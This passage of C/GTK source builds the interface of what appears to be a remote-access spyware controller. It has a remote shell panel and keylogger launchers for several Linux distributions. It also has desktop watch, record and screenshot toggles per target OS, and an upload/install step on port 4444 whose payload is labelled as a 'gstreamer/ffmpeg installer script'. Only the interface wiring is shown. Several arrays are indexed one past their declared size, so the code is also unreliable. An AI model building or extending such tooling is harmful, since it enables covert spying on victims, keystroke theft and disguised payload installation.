    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Windows 10 tab */
    windows10_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Cmd text labels */
    windows7_label_watch = gtk_label_new(NULL);
    windows7_label_record = gtk_label_new(NULL);
    windows7_label_screenshot = gtk_label_new(NULL);
    windows7_label_multi_screenshot = gtk_label_new(NULL);

    windows8_label_watch = gtk_label_new(NULL);
    windows8_label_record = gtk_label_new(NULL);
    windows8_label_screenshot = gtk_label_new(NULL);
    windows8_label_multi_screenshot = gtk_label_new(NULL);

    windows10_label_watch = gtk_label_new(NULL);
    windows10_label_record = gtk_label_new(NULL);
    windows10_label_screenshot = gtk_label_new(NULL);
    windows10_label_multi_screenshot = gtk_label_new(NULL);

    gtk_label_set_markup(GTK_LABEL(windows7_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows7_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows7_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows7_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(windows8_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows8_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows8_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows8_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(windows10_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows10_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows10_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows10_label_multi_screenshot), utf8_multi_screenshot);

    /* Windows7 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_multi_screenshot, 40, 115);

    /* Windows8 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_multi_screenshot, 40, 115);

    /* Windows10 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_multi_screenshot, 40, 115);

    g_free(utf8_watch);
    g_free(utf8_record);
    g_free(utf8_screenshot);
    g_free(utf8_multi_screenshot);

    /* Frame 4 (Remote Shell) */
    frame[4] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[4]), "- Remote Shell - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[4]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[4]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[4], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone), frame[4], 250, 220);

    /* GtkEntry for enter the commands */
    rs_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(rs_entry), "Enter a command here");
    gtk_widget_set_size_request (rs_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_entry, 270, 260);

    /* Start Remote Shell Button */
    rs_start =  gtk_button_new_with_label("Start the Remote Shell");
    gtk_widget_set_size_request(rs_start, 180, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_start, 300, 310);
    g_signal_connect(G_OBJECT(rs_start), "clicked", G_CALLBACK(start_remote_shell), NULL);

    /* Send button */
    rs_send = gtk_button_new_with_label("Send");
    gtk_widget_set_size_request(rs_send, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_send, 520, 260);
    g_signal_connect(G_OBJECT(rs_send), "clicked", G_CALLBACK(send_cmd), rs_entry);

    /* Frame 5 (KeyLogger) */
    frame[5] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[5]), "- KeyLogger - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[5]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[5]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[5], 230, 370);
    gtk_fixed_put(GTK_FIXED(zone), frame[5], 10, 220);

    run_keylogger = gtk_button_new_with_label("Ubuntu Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 260);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(ubuntu_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Mint Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 300);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(mint_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Debian Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 340);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(debian_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Kali Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 380);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(kali_run_the_keylogger), NULL);

    log_file = gtk_button_new_with_label("Logs file");
    gtk_widget_set_size_request(log_file, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_file, 50, 530);
    g_signal_connect(G_OBJECT(log_file), "clicked", G_CALLBACK(open_log_file), NULL);

    gtk_widget_show_all(main_win);

    return;
}

/* Windows Skin N°3 */
void set_skin_number_three(GtkWidget *zone)
{
    /* General Vars */
    GtkWidget *frame[6] = {NULL};
    GtkWidget *sub_frame[2] = {NULL};

    GtkWidget *background = NULL;
    GtkWidget *app_title = NULL;

    char *IP = NULL;

    /* Disconnect from server */
    GtkWidget *ubuntu_disconnect = NULL;
    GtkWidget *mint_disconnect = NULL;
    GtkWidget *debian_disconnect = NULL;
    GtkWidget *kali_disconnect = NULL;

    /* text view on the left side */
    GtkWidget *scrollbar = NULL;

    /* Frame 0 Vars */
    GtkWidget *ip_server = NULL;
    GtkWidget *port_server = NULL;
    GtkWidget *IP_button = NULL;
    GtkWidget *port_button = NULL;

    GtkWidget *log_button = NULL;
    GtkWidget *upload_button = NULL;

    GtkWidget *skin_1 = NULL;
    GtkWidget *skin_2 = NULL;
    GtkWidget *skin_3 = NULL;
    GtkWidget *credits = NULL;

    /* Frame 1 Vars */

    /* Sub Frame 0 Vars */
    GtkWidget *distrib_zone[3] = {NULL};
    GtkWidget *note_book = {NULL};
    GtkWidget *tab_label[3] = {NULL};

    gchar *ubuntu_tab_label = NULL;
    gchar *kali_tab_label = NULL;
    gchar *mint_tab_label = NULL;
    gchar *debian_tab_label = NULL;

    GtkWidget *BG_logo[4] = {NULL};

    /* Sub Frame 1 Vars */
    GtkWidget *windows_zone[3] = {NULL};

    GtkWidget *windows_note_book = {NULL};
    GtkWidget *windows_tab_label[3] = {NULL};

    gchar *windows7_tab_label = NULL;
    gchar *windows8_tab_label = NULL;
    gchar *windows10_tab_label = NULL;

    //GtkWidget *windows_logo[3] = {NULL};
    GtkWidget *windows_BG_logo[3] = {NULL};

    /* Windows tab vars */
    GtkWidget *windows7_button[3] = {NULL};
    GtkWidget *windows8_button[3] = {NULL};
    GtkWidget *windows10_button[3] = {NULL};

    /* Windows7 Labels Vars */
    GtkWidget *windows7_label_watch = NULL;
    GtkWidget *windows7_label_record = NULL;
    GtkWidget *windows7_label_screenshot = NULL;
    GtkWidget *windows7_label_multi_screenshot = NULL;

    /* Windows8 Labels Vars */
    GtkWidget *windows8_label_watch = NULL;
    GtkWidget *windows8_label_record = NULL;
    GtkWidget *windows8_label_screenshot = NULL;
    GtkWidget *windows8_label_multi_screenshot = NULL;

    /* Windows10 Labels Vars */
    GtkWidget *windows10_label_watch = NULL;
    GtkWidget *windows10_label_record = NULL;
    GtkWidget *windows10_label_screenshot = NULL;
    GtkWidget *windows10_label_multi_screenshot = NULL;

    /* Remote shell vars */
    GtkWidget *rs_entry = NULL;
    GtkWidget *rs_send = NULL;
    GtkWidget *rs_start = NULL;

    /* Keylogger Vars */
    GtkWidget *run_keylogger = NULL;
    GtkWidget *log_file = NULL;

    /* Labels Vars */
    GtkWidget *ubuntu_label_watch = NULL;
    GtkWidget *ubuntu_label_record = NULL;
    GtkWidget *ubuntu_label_screenshot = NULL;
    GtkWidget *ubuntu_label_multi_screenshot = NULL;

    GtkWidget *mint_label_watch = NULL;
    GtkWidget *mint_label_record = NULL;
    GtkWidget *mint_label_screenshot = NULL;
    GtkWidget *mint_label_multi_screenshot = NULL;

    GtkWidget *debian_label_watch = NULL;
    GtkWidget *debian_label_record = NULL;
    GtkWidget *debian_label_screenshot = NULL;
    GtkWidget *debian_label_multi_screenshot = NULL;

    GtkWidget *kali_label_watch = NULL;
    GtkWidget *kali_label_record = NULL;
    GtkWidget *kali_label_screenshot = NULL;
    GtkWidget *kali_label_multi_screenshot = NULL;

    gchar *utf8_watch = NULL;
    gchar *utf8_record = NULL;
    gchar *utf8_screenshot = NULL;
    gchar *utf8_multi_screenshot = NULL;

    /* Background uni color image */
    background = gtk_image_new_from_file("IMG/BG_Red.jpg");
    gtk_fixed_put(GTK_FIXED(zone), background, 0, 0);

    app_title = gtk_image_new_from_file("IMG/Titre.png");
    gtk_fixed_put(GTK_FIXED(zone), app_title, -50, 0);

    /* Frame 2 (Text_View) */
    frame[2] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[2]), "- Logs - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[2]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[2]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[2], 540, 160);
    gtk_fixed_put(GTK_FIXED(zone), frame[2], 250, 430);

    /* scrolled window on the side of the windows */
    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_fixed_put(GTK_FIXED(zone), scrollbar, 260, 450);
    gtk_widget_set_size_request(scrollbar, 520, 130);

    /* Side window (log) */
    text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(text_view, 320, 400);

    /* Frame 0 (Upload) */
    frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[0]), "- Upload / install - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[0], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone), frame[0], 250, 10);

    log_entry = gtk_entry_new_with_max_length(40);
    gtk_entry_set_text(GTK_ENTRY(log_entry), "gstreamer/ffmpeg installer script");
    gtk_widget_set_size_request(log_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_entry, 270, 150);

    ip_server = gtk_entry_new_with_max_length(15);
    gtk_entry_set_text(GTK_ENTRY(ip_server), "Server IP");
    gtk_widget_set_size_request(ip_server, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone), ip_server, 270, 100);

    port_server = gtk_entry_new_with_max_length(5);
    gtk_entry_set_text(GTK_ENTRY(port_server), "4444");
    gtk_widget_set_size_request(port_server, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), port_server, 430, 100);

    IP_button = gtk_button_new_with_label("Set Server IP");
    gtk_widget_set_size_request(IP_button, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone), IP_button, 270 , 50);
    g_signal_connect(G_OBJECT(IP_button), "clicked", G_CALLBACK(get_server_ip), ip_server);

    port_button = gtk_button_new_with_label("Set Port");
    gtk_widget_set_size_request(port_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), port_button, 430, 50);
    g_signal_connect(G_OBJECT(port_button), "clicked", G_CALLBACK(get_server_port), port_server);

    log_button = gtk_button_new_with_label("Browse");
    gtk_widget_set_size_request(log_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_button, 520 , 150);
    g_signal_connect(G_OBJECT(log_button), "clicked", G_CALLBACK(open_file), log_entry);

    upload_button = gtk_button_new_with_label("Install");
    gtk_widget_set_size_request(upload_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), upload_button, 640 , 150);
    g_signal_connect(G_OBJECT(upload_button), "clicked", G_CALLBACK(upload), NULL);

    skin_1 = gtk_button_new_with_label("Set Skin N°1");
    gtk_widget_set_size_request(skin_1, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_1, 550 , 50);
    g_signal_connect(G_OBJECT(skin_1), "clicked", G_CALLBACK(cb_set_skin_1), zone);

    skin_2 = gtk_button_new_with_label("Set Skin N°2");
    gtk_widget_set_size_request(skin_2, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_2, 550 , 100);
    g_signal_connect(G_OBJECT(skin_2), "clicked", G_CALLBACK(cb_set_skin_2), zone);

    skin_3 = gtk_button_new_with_label("Set Skin N°3");
    gtk_widget_set_size_request(skin_3, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_3, 670 , 50);
    g_signal_connect(G_OBJECT(skin_3), "clicked", G_CALLBACK(cb_set_skin_3), zone);

    credits = gtk_button_new_with_label("Credits");
    gtk_widget_set_size_request(credits, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), credits, 670 , 100);
    //g_signal_connect(G_OBJECT(credits), "clicked", G_CALLBACK(cb_set_skin_2), zone);

    /* Frame 1 (Command) */
    frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[1]), "- Execute a Command - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[1], 450, 580);
    gtk_fixed_put(GTK_FIXED(zone), frame[1], 800, 10);

    /* Sub Frame 0 (Ubuntu Commands) */
    sub_frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(sub_frame[0]), NULL);
    gtk_frame_set_label_align(GTK_FRAME(sub_frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(sub_frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(sub_frame[0], 410, 250);
    gtk_fixed_put(GTK_FIXED(zone), sub_frame[0], 820, 50);

    /* Creating zone for each tabs of the sub frame */
    distrib_zone[0] = gtk_fixed_new();
    distrib_zone[1] = gtk_fixed_new();
    distrib_zone[2] = gtk_fixed_new();
    distrib_zone[3] = gtk_fixed_new();

    /*  Creating tabs */
    note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(sub_frame[0]), note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(note_book), GTK_POS_TOP);
    //gtk_notebook_set_scrollable(GTK_NOTEBOOK(note_book), TRUE);

    /* Distrib Background color for each tabs */
    BG_logo[0] = gtk_image_new_from_file("IMG/BG_Ubuntu.jpg");
    BG_logo[1] = gtk_image_new_from_file("IMG/Mint19_BG.jpeg");
    BG_logo[2] = gtk_image_new_from_file("IMG/debian_brand_logo.jpg");
    BG_logo[3] = gtk_image_new_from_file("IMG/BG_Kali_2.jpg");

    ubuntu_tab_label    = g_strdup_printf("Ubuntu 16.04");
    mint_tab_label      = g_strdup_printf("Mint 19");
    debian_tab_label    = g_strdup_printf("Debian 9");
    kali_tab_label      = g_strdup_printf("Kali Linux 2.0");

    tab_label[0] = gtk_label_new(ubuntu_tab_label);
    tab_label[1] = gtk_label_new(mint_tab_label);
    tab_label[2] = gtk_label_new(debian_tab_label);
    tab_label[3] = gtk_label_new(kali_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[0], tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[1], tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[2], tab_label[2]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[3], tab_label[3]);

    /* Insert background color on each tabs */
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), BG_logo[0], 0, 0);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), BG_logo[1], 0, 0);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), BG_logo[2], 0, 0);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), BG_logo[3], 0, 0);

    /* Create command text labels */
    ubuntu_label_watch = gtk_label_new(NULL);
    ubuntu_label_record = gtk_label_new(NULL);
    ubuntu_label_screenshot = gtk_label_new(NULL);
    ubuntu_label_multi_screenshot = gtk_label_new(NULL);

    mint_label_watch = gtk_label_new(NULL);
    mint_label_record = gtk_label_new(NULL);
    mint_label_screenshot = gtk_label_new(NULL);
    mint_label_multi_screenshot = gtk_label_new(NULL);

    debian_label_watch = gtk_label_new(NULL);
    debian_label_record = gtk_label_new(NULL);
    debian_label_screenshot = gtk_label_new(NULL);
    debian_label_multi_screenshot = gtk_label_new(NULL);

    kali_label_watch = gtk_label_new(NULL);
    kali_label_record = gtk_label_new(NULL);
    kali_label_screenshot = gtk_label_new(NULL);
    kali_label_multi_screenshot = gtk_label_new(NULL);

    utf8_watch = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Watch desktop on streamming.</span>\n", -1, NULL, NULL, NULL);
    utf8_record = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Record desktop during n seconds.</span>\n", -1, NULL, NULL, NULL);
    utf8_screenshot = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Take a screenshot.</span>\n", -1, NULL, NULL, NULL);
    utf8_multi_screenshot = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Take multiples screenshots in n secondes.</span>\n", -1, NULL, NULL, NULL);

    gtk_label_set_markup(GTK_LABEL(ubuntu_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(mint_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(mint_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(mint_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(mint_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(debian_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(debian_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(debian_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(debian_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(kali_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(kali_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(kali_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(kali_label_multi_screenshot), utf8_multi_screenshot);

    /* Ubuntu tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_multi_screenshot, 40, 115);

    /* Mint tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_multi_screenshot, 40, 115);

    /* Debian tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_multi_screenshot, 40, 115);

    /* Kali tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_multi_screenshot, 40, 115);

    /* Ubuntu tab */
    ubuntu_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[0] , 10 , 20);
    g_signal_connect(G_OBJECT(ubuntu_button[0] ), "toggled", G_CALLBACK(cb_ubuntu_watch), IP);

    ubuntu_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(ubuntu_button[1]), "toggled", G_CALLBACK(cb_ubuntu_record), NULL);

    ubuntu_button[2]  = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(ubuntu_button[2]), "toggled", G_CALLBACK(cb_ubuntu_screenshot), NULL);

    ubuntu_button[3]  = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(ubuntu_button[3]), "toggled", G_CALLBACK(cb_ubuntu_mutli_screenshot), NULL);

    /* Close server connection */
    ubuntu_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(ubuntu_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(ubuntu_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    mint_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(mint_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(mint_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    debian_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(debian_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(debian_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    kali_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(kali_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(kali_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    /* Mint tab */
    mint_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(mint_button[0]), "toggled", G_CALLBACK(cb_mint_watch), IP);

    mint_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(mint_button[1]), "toggled", G_CALLBACK(cb_mint_record), NULL);

    mint_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(mint_button[2]), "toggled", G_CALLBACK(cb_mint_screenshot), NULL);

    mint_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(mint_button[3]), "toggled", G_CALLBACK(cb_mint_mutli_screenshot), NULL);

    /* Debian tab */
    debian_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(debian_button[0]), "toggled", G_CALLBACK(cb_debian_watch), IP);

    debian_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(debian_button[1]), "toggled", G_CALLBACK(cb_debian_record), NULL);

    debian_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(debian_button[2]), "toggled", G_CALLBACK(cb_debian_screenshot), NULL);

    debian_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(debian_button[3]), "toggled", G_CALLBACK(cb_debian_mutli_screenshot), NULL);

    /* Kali tab */
    kali_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(kali_button[0]), "toggled", G_CALLBACK(cb_kali_watch), IP);

    kali_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(kali_button[1]), "toggled", G_CALLBACK(cb_kali_record), NULL);

    kali_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(kali_button[2]), "toggled", G_CALLBACK(cb_kali_screenshot), NULL);

    kali_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(kali_button[3]), "toggled", G_CALLBACK(cb_kali_mutli_screenshot), NULL);

    /* Sub frame 1 (Windows cmds) */
    sub_frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(sub_frame[1]), NULL);
    gtk_frame_set_label_align(GTK_FRAME(sub_frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(sub_frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(sub_frame[1], 410, 250);
    gtk_fixed_put(GTK_FIXED(zone), sub_frame[1], 820, 320);

    /* Creating zone for each tabs of the windows sub frame */
    windows_zone[0] = gtk_fixed_new();
    windows_zone[1] = gtk_fixed_new();
    windows_zone[2] = gtk_fixed_new();

    /*  Creating tabs */
    windows_note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(sub_frame[1]), windows_note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(windows_note_book), GTK_POS_TOP);
    //gtk_notebook_set_scrollable(GTK_NOTEBOOK(windows_note_book), TRUE);

    /* Distrib Background color for each tabs */
    windows_BG_logo[0] = gtk_image_new_from_file("IMG/Windows_IMG/windows7_BG2.jpg");
    windows_BG_logo[1] = gtk_image_new_from_file("IMG/Windows_IMG/windows8_BG2.jpeg");
    windows_BG_logo[2] = gtk_image_new_from_file("IMG/Windows_IMG/Windows10_BG2.jpg");

    windows7_tab_label  = g_strdup_printf("Windows 7");
